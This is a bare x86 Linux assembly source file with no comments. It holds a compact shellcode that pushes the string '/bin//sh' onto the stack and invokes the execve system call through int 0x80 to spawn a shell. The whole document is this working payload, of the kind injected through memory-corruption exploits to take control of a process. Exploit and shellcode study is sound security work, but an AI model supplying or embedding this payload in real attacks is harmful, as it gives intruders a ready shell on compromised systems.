section .text

global _start

 _start:


        xor ebx,ebx
        mul ebx
        add al,11
        push ebx
        push ebx
        pop ecx
        push 0x68732f2f
        push 0x6e69622f
        mov ebx,esp
        int 0x80
